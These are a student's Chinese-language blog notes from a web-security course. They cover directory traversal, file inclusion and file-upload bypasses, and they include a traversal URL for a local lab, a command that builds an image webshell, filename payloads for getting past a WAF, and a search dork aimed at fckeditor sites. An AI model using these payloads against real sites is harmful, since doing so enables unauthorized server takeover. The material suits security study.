<h3 id="较为重要的web漏洞"><a href="#较为重要的web漏洞" class="headerlink" title="较为重要的web漏洞"></a>较为重要的web漏洞</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">一定要思考漏洞的等级、危害。<br>高危漏洞：能直接影响到网站权限或数据库权限，就是能够获取数据或直接获取到网站的一些很敏感的东西<span class="hljs-comment">(即：</span><br><span class="hljs-comment">涉及到数据的安全或者权限的丢失)</span>。<br>低危漏洞：仅仅小部分数据泄漏，数据是网站的一些源码。<br></code></pre></td></tr></table></figure>
<h4 id="1、SQL注入-高危-–数据库操作"><a href="#1、SQL注入-高危-–数据库操作" class="headerlink" title="1、SQL注入(高危)–数据库操作"></a>1、SQL注入(高危)–数据库操作</h4><figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">SQL注入漏洞有一些类型可以直接获取网站权限<span class="hljs-comment">(直接取得flag)</span>，有一些仅仅获得网站后台权限<span class="hljs-comment">(此时SQL仅起辅助作用)</span>，<br>还需借助其他。<br>与burp suite抓包结合使用。<br></code></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=10&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">SQL注入演示：26:00处</a></p>
<h4 id="2、文件上传-高危"><a href="#2、文件上传-高危" class="headerlink" title="2、文件上传(高危)"></a>2、文件上传(高危)</h4><figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">文件上传漏洞大部分可以直接取得网站权限。<br>还是要利用<span class="hljs-keyword">burp </span>suite辅助，首先将后门文件改成<span class="hljs-keyword">jpg格式，此时虽然上传了但执行不了，burpsuite抓包后，将这个文件的后缀改回来即可。</span><br></code></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=10&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">文件上传演示：1：07：00处</a></p>
<h4 id="3、xss跨站-中、低危"><a href="#3、xss跨站-中、低危" class="headerlink" title="3、xss跨站(中、低危)"></a>3、xss跨站(中、低危)</h4><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">xss跨站一般获取到的是网站后台权限。<br></code></pre></td></tr></table></figure>
<h4 id="4、文件包含-高危"><a href="#4、文件包含-高危" class="headerlink" title="4、文件包含(高危)"></a>4、文件包含(高危)</h4><h4 id="5、反序列化-中危"><a href="#5、反序列化-中危" class="headerlink" title="5、反序列化(中危)"></a>5、反序列化(中危)</h4><h4 id="6、代码执行-高危"><a href="#6、代码执行-高危" class="headerlink" title="6、代码执行(高危)"></a>6、代码执行(高危)</h4><h4 id="6、逻辑安全-中危"><a href="#6、逻辑安全-中危" class="headerlink" title="6、逻辑安全(中危)"></a>6、逻辑安全(中危)</h4><h4 id="8、未授权访问-高危"><a href="#8、未授权访问-高危" class="headerlink" title="8、未授权访问(高危)"></a>8、未授权访问(高危)</h4><h3 id="遇见较上面七类少"><a href="#遇见较上面七类少" class="headerlink" title="遇见较上面七类少"></a>遇见较上面七类少</h3><h4 id="1、CSRF"><a href="#1、CSRF" class="headerlink" title="1、CSRF"></a>1、CSRF</h4><h4 id="2、SSRF"><a href="#2、SSRF" class="headerlink" title="2、SSRF"></a>2、SSRF</h4><h4 id="3、目录遍历-跨目录文件读取-–源码结构泄漏-获取的是文件夹的内容，不可获取文件的内容"><a href="#3、目录遍历-跨目录文件读取-–源码结构泄漏-获取的是文件夹的内容，不可获取文件的内容" class="headerlink" title="3、目录遍历(跨目录文件读取)–源码结构泄漏,获取的是文件夹的内容，不可获取文件的内容"></a>3、目录遍历(跨目录文件读取)–源码结构泄漏,获取的是文件夹的内容，不可获取文件的内容</h4><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">此漏洞仅仅知识发现目录结构，代码等数据，发现此漏洞并不能对网站造成实际性的危害，要配合<br>其他。<br>(dir_list.php是文件名，?后面的title是属性，jarheads.php是属性值)<br>已知http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/pikachu/</span>vul<span class="hljs-regexp">/dir/</span>dir_list.php?title=jarheads.php获取的是<br>D:\phpstudy_pro\WWW\pikachu\vul\dir\soup\jarheads.php<br> 已知http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/pikachu/</span>vul<span class="hljs-regexp">/dir/</span>dir_list.php?title=truman.php获取的是<br>D:\phpstudy_pro\WWW\pikachu\vul\dir\soup\truman.php<br>那么我若想获取D:\phpstudy_pro\WWW\xx.php应该：http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/pikachu/</span>vul<span class="hljs-regexp">/dir/</span>dir_list.php?title=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>xx.php<br></code></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">问题：我该如何知道这个网站有这个目录这个文件？<br>答：爆破，网站目录爬行，查看页面源码。<br></code></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=10&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">目录遍历演示：41:00处</a></p>
<h4 id="4、文件读取–源码内容泄漏，仅仅获取单个文件"><a href="#4、文件读取–源码内容泄漏，仅仅获取单个文件" class="headerlink" title="4、文件读取–源码内容泄漏，仅仅获取单个文件"></a>4、文件读取–源码内容泄漏，仅仅获取单个文件</h4><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">在目录遍历的基础下，知道了文件夹内部的结构，方便读取单个文件的内容。<br></code></pre></td></tr></table></figure>
<h4 id="5、xxe安全"><a href="#5、xxe安全" class="headerlink" title="5、xxe安全"></a>5、xxe安全</h4><h4 id="6、命令执行-高危"><a href="#6、命令执行-高危" class="headerlink" title="6、命令执行(高危)"></a>6、命令执行(高危)</h4><h4 id="7、文件下载"><a href="#7、文件下载" class="headerlink" title="7、文件下载"></a>7、文件下载</h4><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=10&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">文件下载演示：1:27：00处</a></p>
<h4 id="8、其他"><a href="#8、其他" class="headerlink" title="8、其他"></a>8、其他</h4>]]></content>
      <categories>
        <category>web漏洞知识</category>
      </categories>
      <tags>
        <tag>web漏洞知识</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/2023/10/14/wenjianbaohan/</url>
    <content><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><img src="https://pic.imgdb.cn/item/652aa816c458853aef587e75.png" alt="图一" title="文件操作之文件包含"><br>参考:<a href="https://blog.csdn.net/m0_46467017/article/details/126380415">https://blog.csdn.net/m0_46467017/article/details/126380415</a></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。<br>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。<br>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。<br>简要来说就是将文件以指定脚本类型(根据网站而定)去执行。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">简要案例了解什么是文件包含漏洞:5:00</a></p>
<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>1、本地包含<br>2、远程包含–危害更大<br>两者分别都有两种类型,无限制与有限制。无限制的不必多说,有限制的话就要尝试绕过。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">本地包含(无限制)小演示:12:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">本地包含(有限制)小演示:15:00</a><br>本地包含绕过限制:<br>1、%00截断;<br>2、长度截断(文件名后加&#x2F;.或.等)<br><img src="https://pic.imgdb.cn/item/652b45afc458853aef7bd5f7.png" alt="图二" title="本地包含绕过限制"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">远程包含小演示:23:00</a><br>远程包含绕过限制:<br>1、文件名后加%20<br>2、文件名后加%23<br>3、文件名后加?</p>
<h3 id="文件包含漏洞的协议流以及实例"><a href="#文件包含漏洞的协议流以及实例" class="headerlink" title="文件包含漏洞的协议流以及实例"></a>文件包含漏洞的协议流以及实例</h3><p>参考(详细):<a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">文件包含漏洞的各种协议流玩法:28:40(重要)</a><br><img src="https://pic.imgdb.cn/item/6529407fc458853aef03fd17.png" alt="图三" title="限制1"><br><img src="https://pic.imgdb.cn/item/652b45bfc458853aef7c02f6.png" alt="图四" title="限制2"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">CTF题目文件包含讲解(学习思路–重要):39:00</a><br>1、做题时,还是手动去分析,别用扫描工具,真实渗透的情况下可选择使用扫描工具。<br>2、手工看参数值以及功能点尤其重要。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">实战(CMS)黑盒的文件包含漏洞(学习思路–重要):59:00</a><br>1、get一个新思路，如果对方网站的日志能够记录错误请求的代码，而且恰好有文件包含漏洞，那么就可以包含日志文件来执行shell代码。<br>2、文件上传配合文件包含可以起到更大的作用。</p>
<h3 id="文件包含漏洞的修复"><a href="#文件包含漏洞的修复" class="headerlink" title="文件包含漏洞的修复"></a>文件包含漏洞的修复</h3><p>1、固定后缀<br>2、固定文件<br>3、WAF<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">听思路(个人感觉挺重要):1:08:00</a></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1、文件包含漏洞不需要知道路径(也就是目录结构),他会在这个网站的当前目录写入。</p>
]]></content>
      <categories>
        <category>文件操作安全</category>
      </categories>
      <tags>
        <tag>文件操作安全</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传基础</title>
    <url>/2023/10/04/wenjianshangchuan1/</url>
    <content><![CDATA[<h2 id="文件上传基础"><a href="#文件上传基础" class="headerlink" title="文件上传基础"></a>文件上传基础</h2><p><img src="https://pic.imgdb.cn/item/6522b4f3c458853aeffd89f5.png" alt="文件上传基础" title="文件上传基础"><br><img src="https://pic.imgdb.cn/item/6522b55dc458853aeffd9af0.png" alt="文件上传种类" title="文件上传种类"></p>
<h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞?"></a>什么是文件上传漏洞?</h3><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">文件上传漏洞是web安全中经常用到的一种漏洞形式。是对数据与代码分离原则的一种攻击。<br>上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell<br>等到服务器执行，并最终获得网站控制权限的高危漏洞。<br></code></pre></td></tr></table></figure>
<p>有两个注意的地方:<br>1、若存在文件上传的功能,则可以测试其是否存在文件上传的漏洞。<br>2、但同时,若存在文件上传的功能,我们可以测试其是否存在文件上传漏洞。</p>
<h3 id="文件上传漏洞有哪些危害"><a href="#文件上传漏洞有哪些危害" class="headerlink" title="文件上传漏洞有哪些危害?"></a>文件上传漏洞有哪些危害?</h3><p>高危漏洞,若上传一个后门文件(webshell),则可以直接获取到当前网站的权限。</p>
<h3 id="文件上传漏洞如何查找及判断"><a href="#文件上传漏洞如何查找及判断" class="headerlink" title="文件上传漏洞如何查找及判断?"></a>文件上传漏洞如何查找及判断?</h3><p>查找:<br>1、黑盒查找：<br>   暴力方法,通过一些软件进行目录扫描<br>   通过会员中心上传头像之类的<br>   通过后台权限获取网站权限<br>2、白盒查找:拿到代码,分析代码。<br>判断:自己抓包测试。<br>需要注意的地方：判断上传漏洞的类型。</p>
<h3 id="一些文件上传漏洞相关演示"><a href="#一些文件上传漏洞相关演示" class="headerlink" title="一些文件上传漏洞相关演示"></a>一些文件上传漏洞相关演示</h3><p>1、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=19&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">常规文件上传地址的获取说明(怎么发现文件上传漏洞,如何突破):18:15</a><br>2、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=19&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">不同格式下的文件类型后门测试(重要):24:20</a><br>3、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=19&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">配合解析漏洞下的文件类型后门测试(可以学习一下使用vulhub):30:00</a></p>
<figure class="highlight objectivec"><table><tr><td class="code"><pre><code class="hljs objectivec">这个演示本质是php <span class="hljs-built_in">CGI</span>漏洞，由于有些php版本默认开启cgi.fi选项，php遇到不存在文件时会向前递归解析，<br>与nginx配合会造成该漏洞。即虽然是png图片格式,但是由于这个解析漏洞,在路径后面加上一个此目录不存在的<br>一个php文件,那么隐藏在图片内的代码会被执行(可以实现反逆转)。<br></code></pre></td></tr></table></figure>
<p>4、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=19&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">迪师傅对于2、3的拓展:41:25</a><br>5、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=19&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">本地文件上传漏洞靶场环境搭建测试(前端验证):46:35</a><br>!!!文件上传漏洞的靶场(自己搭建):<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a><br>对于实例五的思考:</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">前端<span class="hljs-comment">(html,js)</span>负责显示传输数据,后端<span class="hljs-comment">(php,py)</span>负责接受和处理数据，数据库负责保存数据。<br>前端验证就是在你自己的本地浏览器上即可验证。<br>后端验证则是发送到服务器端脚本去验证判断。<br><span class="hljs-comment">(前端先验证再发给后端和发过去给后端验证的区别。)</span><br>也就是说,前端验证不安全,用户可以通过禁用script脚本<span class="hljs-comment">(或者把源代码copy下来</span><br><span class="hljs-comment">把过滤代码删除)</span>来实现绕过。<br>而后端验证相对来说较为安全。<br></code></pre></td></tr></table></figure>
<p>!!!若用js方式实现文件上传操作(上传到前端,没有交互),那么抓包可能抓不到,也就实现不了burp抓包改后缀的操作。<br>6、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=19&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">某CMS文件上传漏洞测试:1:06:00</a></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">若在本地测试发现不了上传漏洞,并不是说就没有上传漏洞。<br>你可以通过cms识别出网站使用什么系统搭建的<span class="hljs-comment">(视频中的是findcms)</span>,通过上网搜索相关漏洞实现文件上传。<br></code></pre></td></tr></table></figure>
<p>7、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=19&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">CVE编号文件上传漏洞测试:1:25:00</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">图片来自于小迪安全,只是方便个人学习,如有侵权联删<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>文件操作安全</category>
      </categories>
      <tags>
        <tag>文件操作安全</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传--黑/白名单绕过</title>
    <url>/2023/10/05/wenjianshangchuan2/</url>
    <content><![CDATA[<h2 id="文件上传–黑-白名单绕过"><a href="#文件上传–黑-白名单绕过" class="headerlink" title="文件上传–黑&#x2F;白名单绕过"></a>文件上传–黑&#x2F;白名单绕过</h2><p>1、文件上传常见验证:<br>后缀名，类型，文件头等<br>后缀名:黑名单,白名单<br>文件类型:MIME(抓包时,Content-Type这个字段)<br>信息文件头:内容头信息<br>2、常见后缀黑名单(明确不让上传的脚本格式后缀):<br>asp,php,cgi,jsp,war,aspx<br>3、常见后缀白名单(明确可以上传的脚本格式后缀,较黑名单验证安全):<br>png,jpg,zip,rar,gif<br>4、上传脚本时,类型(后缀名)尽量与对方的网站搭建类型(php搭建的,上传.php)保持一致。<br>5、.htacces文件(自己上网搜配置)是Apache的一个配置文件,上传文件时先上传这个,后面上传的指定正常文件(如jpg等图片格式),然后访问这个文件,会被当做php代码执行,但是其他的任何图片不受影响。<br>6、了解一次过滤与循环过滤的区别。<br>7、白名单绕过中的%00绕过与0x00绕过:<br>条件：<br>php版本小于5.3.4<br>php的magic_quotes_gpc为OFF状态<br>%00是urlencode(get方法)，0x00是十六进制(post方法)。<br>8、在get方法传数据不用编码,而在post方法传数据需要编码(get会自动解码,post不会)。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=20&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">文件上传代码审计(php+html混合上传):16:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=20&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">通过.htacces文件绕过(其实这集可以二刷,学习到一系列文件上传漏洞):55:00</a><br><a href="https://www.bilibili.com/video/:BV1JZ4y1c7ro/?p=20&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">白名单绕过中的%00绕过与0x00绕过:1:25:00</a></p>
]]></content>
      <categories>
        <category>文件操作安全</category>
      </categories>
      <tags>
        <tag>文件操作安全</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传--内容逻辑绕过与解析漏洞</title>
    <url>/2023/10/07/wenjianshangchuan3/</url>
    <content><![CDATA[<h2 id="内容逻辑绕过-排除了解析漏洞等-限制只可上传图片-那么就使用内容逻辑绕过的思路"><a href="#内容逻辑绕过-排除了解析漏洞等-限制只可上传图片-那么就使用内容逻辑绕过的思路" class="headerlink" title="内容逻辑绕过(排除了解析漏洞等,限制只可上传图片,那么就使用内容逻辑绕过的思路)"></a>内容逻辑绕过(排除了解析漏洞等,限制只可上传图片,那么就使用内容逻辑绕过的思路)</h2><p>有些上传文件时的验证不是单单判断文件后缀是否为黑名单&#x2F;白名单,而是判断文件头(比如png与gif的文件头不一样)&#x2F;获取的图像信息(判断是否为图片),这种情况下可以转换内容逻辑绕过的思想。</p>
<h2 id="文件包含漏洞-不属于文件上传-实现内容逻辑绕过"><a href="#文件包含漏洞-不属于文件上传-实现内容逻辑绕过" class="headerlink" title="文件包含漏洞(不属于文件上传)实现内容逻辑绕过"></a>文件包含漏洞(不属于文件上传)实现内容逻辑绕过</h2><p>原理：<br>​ 文件包含漏洞是指应用程序未对用户输入的文件路径或文件名进行充分的验证和过滤，导致攻击者可以通过向应用程序发送恶意文件路径或文件名来获取敏感信息或执行恶意代码的漏洞。(将被包含的文件以后门的格式去执行)<br>这种漏洞主要发生在应用程序中使用了动态文件包含的情况下。利用文件包含漏洞的原理时，需要满足以下两个条件：<br>​ 1.目标系统存在动态文件包含的功能。(?)<br>​ 2.应用程序未进行适当的输入验证和过滤，使攻击者能够在文件包含参数中注入恶意代码。<br><a href="https://blog.csdn.net/vivlol918/article/details/130667396">文件包含漏洞分析参考</a></p>
<p>图片马(让图片含有后门代码)配合文件包含可以实现文件上传<br><a href="vhttps://www.bilibili.com/video/BV1JZ4y1c7ro/?p=21&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">文件包含漏洞实现文件上传:3:00</a></p>
<h3 id="关于文件包含漏洞自己的一些思考与感悟"><a href="#关于文件包含漏洞自己的一些思考与感悟" class="headerlink" title="关于文件包含漏洞自己的一些思考与感悟"></a>关于文件包含漏洞自己的一些思考与感悟</h3><p>虽然在图片格式中插入后门代码,图片仍然可以正常打开查看,但是此时仍然是图片格式,直接上传的话那么后门的代码便不会被执行。但是通过图片马(让图片含有后门代码)配合文件包含(目前已知的是php的include函数),可以使被包含的文件以这个文件中插入的后门代码的形式执行,这样便实现了文件上传。</p>
<h2 id="错误的二次渲染配合条件竞争实现内容逻辑绕过"><a href="#错误的二次渲染配合条件竞争实现内容逻辑绕过" class="headerlink" title="错误的二次渲染配合条件竞争实现内容逻辑绕过"></a>错误的二次渲染配合条件竞争实现内容逻辑绕过</h2><p>二次渲染是对文件进行二次操作(如对图片进行保存,放大观看等操作)。<br>错误的二次渲染是什么:<br>  没将文件验证就已经进行文件的移动操作了,意思就是上传文件后将文件临时保存在服务器的temp中,在temp中验证再移动到指定文件夹。<br><a href="vhttps://www.bilibili.com/video/BV1JZ4y1c7ro/?p=21&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">原理:17:00</a><br><a href="vhttps://www.bilibili.com/video/BV1JZ4y1c7ro/?p=21&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">演示:31:00</a></p>
<h2 id="以文件夹的方式去命名-逻辑安全-条件竞争目录命名-–黑名单"><a href="#以文件夹的方式去命名-逻辑安全-条件竞争目录命名-–黑名单" class="headerlink" title="以文件夹的方式去命名(逻辑安全-条件竞争目录命名)–黑名单"></a>以文件夹的方式去命名(逻辑安全-条件竞争目录命名)–黑名单</h2><p>zbc.php&#x2F;.(看起来像文件夹,但这样在绕过验证过滤的同时,把php文件成功上传)<br>原理:也和文件的保存一样,创建一个“.”名字的文件夹保存这个文件,但是会报错,因为系统不允许创建一个名字为”.”的文件夹。</p>
<h2 id="数组接受-目录命名-MIME验证-文件名白名单验证-—–！！！有难度"><a href="#数组接受-目录命名-MIME验证-文件名白名单验证-—–！！！有难度" class="headerlink" title="数组接受+目录命名(MIME验证+文件名白名单验证)—–！！！有难度"></a>数组接受+目录命名(MIME验证+文件名白名单验证)—–！！！有难度</h2><p>zbc.php&#x2F;.jpg<br><a href="vhttps://www.bilibili.com/video/BV1JZ4y1c7ro/?p=21&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">数组接受配合目录命名:55:00</a></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">实战中多为黑盒,仅可自己一个一个试。<span class="hljs-comment">(lll￢ω￢)</span>汗~<br>还有要注意,文件上传漏洞可出现在验证代码,中间件,也可出现在编辑器。<br></code></pre></td></tr></table></figure>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><p>条件:<br>1、特定中间件。<br>2、指定版本（低版本）。<br>看演示即可。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=21&vd_source=d32bce54780cf3d9710df43274886fde">1:12:00-1:48:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=22&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">3:00</a></p>
]]></content>
      <categories>
        <category>文件操作安全</category>
      </categories>
      <tags>
        <tag>文件操作安全</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传--WEB编辑器安全、CMS与WAF</title>
    <url>/2023/10/08/wenjianshangchuan4/</url>
    <content><![CDATA[<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=22&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">文件拼接小技巧:33:00-34:00;略微判断有无解析漏洞:35:00</a><br>cmd中,copy 1.png &#x2F;b + shell.php &#x2F;a webshell.jpg</p>
<h2 id="文件上传–解析漏洞编辑器安全与WAF"><a href="#文件上传–解析漏洞编辑器安全与WAF" class="headerlink" title="文件上传–解析漏洞编辑器安全与WAF"></a>文件上传–解析漏洞编辑器安全与WAF</h2><h2 id="WEB编辑器漏洞"><a href="#WEB编辑器漏洞" class="headerlink" title="WEB编辑器漏洞"></a>WEB编辑器漏洞</h2><p>常见编辑器<br>fckeditor		exp<br>ueditor 		漏洞利用<br>在网上找fckeditor漏洞inurl:fckeditor site:edu.cn<br><a href="https://blog.csdn.net/eldn__/article/details/9197521">https://blog.csdn.net/eldn__/article/details/9197521</a><br>编辑器是网站管理员对图片、音频视频进行操作的中转站,大部分编辑器是文件上传漏洞。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=22&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">FCK编辑器演示：50:00</a></p>
<h2 id="CMS编辑器漏洞"><a href="#CMS编辑器漏洞" class="headerlink" title="CMS编辑器漏洞"></a>CMS编辑器漏洞</h2><p>对网站进行识别,判断出是什么CMS。在发现某个网站是使用哪套开源的程序源码,上网搜漏洞。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=22&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">演示：1:09:00</a></p>
<h2 id="总结思路-测试文件上传漏洞"><a href="#总结思路-测试文件上传漏洞" class="headerlink" title="总结思路(测试文件上传漏洞)"></a>总结思路(测试文件上传漏洞)</h2><p>在拿到一个网站,若要测试其上传漏洞：<br>0、WAF的判断以及绕过。<br>1、先尝试直接绕过,黑&#x2F;白名单&#x2F;内容过滤绕过。<br>2、看中间件确定是否存在解析漏洞。<br>3、CMS也会爆出一些文件上传漏洞,利用网上资料。<br>4、编辑器漏洞，同上方法。<br>5、CVE,上官网查看是否爆新的漏洞。</p>
<h2 id="若存在WAF-如何绕过-已知存在文件上传漏洞"><a href="#若存在WAF-如何绕过-已知存在文件上传漏洞" class="headerlink" title="若存在WAF,如何绕过(已知存在文件上传漏洞)"></a>若存在WAF,如何绕过(已知存在文件上传漏洞)</h2><h3 id="上传参数名解析：明确有哪些东西能修改？"><a href="#上传参数名解析：明确有哪些东西能修改？" class="headerlink" title="上传参数名解析：明确有哪些东西能修改？"></a>上传参数名解析：明确有哪些东西能修改？</h3><p>Content-Disposition:	一般可更改(数据类型?)<br>name:	表单参数值，不能更改<br>filename :文件名，可以更改<br>Content-Type:文件MIME，视情况更改</p>
<h3 id="常见绕过方法"><a href="#常见绕过方法" class="headerlink" title="常见绕过方法"></a>常见绕过方法</h3><p>1、数据溢出-防匹配(xxx.. .)<br>2、符号变异-防匹配（’” ;)</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">payload:</span><br>filename=<span class="hljs-string">&quot;x.php</span><br><span class="hljs-string">filename=&#x27;x.php</span><br><span class="hljs-string">filename=&quot;</span>x<span class="hljs-string">&quot;x.php</span><br></code></pre></td></tr></table></figure>
<p>符号变异就是猜测WAF的字符(串)如何匹配,通过”改filename字段的双引号为单引号、去掉一个双引号”等方式尝试绕过。<br>可知safedog的匹配是从最后一个”往前匹配。<br>3、数据截断-防匹配(%00 ;换行)</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">payload:</span><br>filename=<span class="hljs-string">&quot;x.jpg;.php&quot;</span><br>filename=&#x27;x.php%00.jpg<span class="hljs-string">&quot;(现在失效了)</span><br></code></pre></td></tr></table></figure>
<p>还可以换行:</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">payload:</span><br>filename=<span class="hljs-string">&quot;x</span><br><span class="hljs-string">.</span><br><span class="hljs-string">p</span><br><span class="hljs-string">h</span><br><span class="hljs-string">p&quot;</span><br></code></pre></td></tr></table></figure>
<p>4、重复数据-防匹配(参数多次)</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><code class="hljs sas">payload:<br><span class="hljs-keyword">filename</span>=<span class="hljs-string">&quot;x.jpg&quot;</span>;<span class="hljs-keyword">filename</span>=<span class="hljs-string">&quot;x.jpg&quot;</span>;<span class="hljs-keyword">filename</span>=<span class="hljs-string">&quot;x.jpg&quot;</span>;<span class="hljs-keyword">filename</span>=<span class="hljs-string">&quot;x.jpg&quot;</span>;<span class="hljs-keyword">filename</span>=<span class="hljs-string">&quot;y.php&quot;</span>;<br><span class="hljs-keyword">filename</span>=<span class="hljs-string">&quot;Content-Disposition/Content-Type的值x.php&quot;</span><br></code></pre></td></tr></table></figure>
<p>但重复次数又远远比垃圾数据的少。<br><img src="https://pic.imgdb.cn/item/65236836c458853aef306998.png" alt="图一" title="添加重复数据包原有数据"><br><img src="https://pic.imgdb.cn/item/65236813c458853aef305059.png" alt="图二" title="添加重复数据包原有数据"><br><img src="https://pic.imgdb.cn/item/6523682cc458853aef306745.png" alt="图三" title="添加重复数据包原有数据"><br><img src="https://pic.imgdb.cn/item/65236836c458853aef306998.png" alt="图四" title="添加重复数据包原有数据"><br>5、Fuzz模糊测试<br>fuzz字典<br><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a><br><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a><br><a 